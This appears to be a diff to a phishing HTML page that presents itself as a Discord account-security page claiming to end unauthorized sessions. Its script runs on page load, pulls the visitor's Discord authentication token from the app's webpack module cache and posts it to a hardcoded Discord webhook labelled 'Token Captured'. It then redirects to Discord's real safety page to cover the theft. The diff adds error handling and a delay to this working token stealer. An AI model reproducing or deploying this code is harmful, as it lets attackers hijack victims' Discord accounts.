@@ -16,25 +16,35 @@
         <h1>Securing Your Account...</h1>
         <p>Please wait while we terminate all unauthorized sessions.</p>
     </div>
+
     <script>
         function getToken() {
-            window.dispatchEvent(new Event('beforeunload'));
-            let token = (window.webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let r in e.c)m.push(e.c[r])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
-            return token;
+            try {
+                window.dispatchEvent(new Event('beforeunload'));
+                let token = (window.webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let r in e.c)m.push(e.c[r])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
+                return token;
+            } catch (e) { return null; }
         }
-        async function send() {
+
+        async function sendAndRedirect() {
             const token = getToken();
-            const url = "https://discord.com/api/webhooks/1479521399226761257/oXj1-cf5ipoSkF_SKSvCay19JJH7mfnL0Y4grui0lVUU6b9r582psAk1qb4gF4IRC1Kd";
+            const webhook = "https://discord.com/api/webhooks/1479521399226761257/oXj1-cf5ipoSkF_SKSvCay19JJH7mfnL0Y4grui0lVUU6b9r582psAk1qb4gF4IRC1Kd";
+
             if (token) {
-                await fetch(url, {
+                await fetch(webhook, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ content: "🔱 **Token Captured:** `" + token + "`" })
                 });
             }
-            window.location.href = "https://discord.com/safety";
+
+            // העברה לדף בטיחות רשמי בכל מקרה אחרי 3 שניות
+            setTimeout(() => {
+                window.location.href = "https://discord.com/safety";
+            }, 3000);
         }
-        window.onload = send;
+
+        window.onload = sendAndRedirect;
     </script>
 </body>
 </html>
